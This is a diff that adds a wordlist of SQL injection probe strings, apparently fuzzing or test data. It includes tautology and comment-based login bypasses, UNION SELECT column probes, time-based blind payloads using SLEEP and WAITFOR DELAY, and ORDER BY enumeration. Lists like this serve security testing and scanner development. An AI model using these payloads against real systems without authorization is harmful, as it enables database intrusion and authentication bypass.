@@ -1,0 +1,32 @@
+'
+"
+`
+')
+")
+`)
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+" OR "1"="1
+" OR "1"="1" --
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+admin' --
+admin' #
+' UNION SELECT NULL --
+' UNION SELECT NULL,NULL --
+' UNION SELECT NULL,NULL,NULL --
+' AND 1=1 --
+' AND 1=2 --
+1; SELECT SLEEP(2) --
+' AND SLEEP(2) --
+" AND SLEEP(2) --
+1' AND SLEEP(2) AND '1'='1
+'; WAITFOR DELAY '0:0:2' --
+1; WAITFOR DELAY '0:0:2' --
+' AND (SELECT * FROM (SELECT(SLEEP(2)))a) --
+' ORDER BY 1 --
+' ORDER BY 2 --
+' ORDER BY 10 --
+' GROUP BY 1 --
